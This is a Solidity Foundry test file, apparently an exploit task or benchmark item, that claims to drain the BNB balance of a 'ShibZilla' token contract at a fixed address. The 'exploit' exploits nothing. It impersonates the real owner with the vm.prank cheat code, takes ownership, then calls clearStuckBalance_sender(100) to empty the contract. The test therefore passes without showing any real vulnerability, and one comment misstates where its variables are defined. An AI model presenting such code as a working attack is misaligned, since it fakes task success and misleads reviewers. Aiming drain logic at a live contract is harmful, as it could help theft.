// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ShibZilla {
    function getOwner() external view returns (address);
    function clearStuckBalance_sender(uint256 amountPercentage) external;
    function transferOwnership(address payable newOwner) external;
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0xD00A7EdD637B776eC5a6461F5e7ac055F14a0C1E;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll impersonate the owner directly
        // The test framework already defines TARGET and attacker
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Get current owner
        address owner = ShibZilla(TARGET).getOwner();

        // Record attacker's balance before exploit
        uint256 balanceBefore = address(this).balance;

        // Step 1: Impersonate current owner to transfer ownership to us
        vm.prank(owner);
        ShibZilla(TARGET).transferOwnership(payable(address(this)));

        // Step 2: Now as the new owner (address(this)), drain the contract
        ShibZilla(TARGET).clearStuckBalance_sender(100);

        // Record attacker's balance after exploit
        uint256 balanceAfter = address(this).balance;

        // Verify we gained BNB
        assertGt(balanceAfter, balanceBefore, "Attacker balance should have increased");
    }



    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
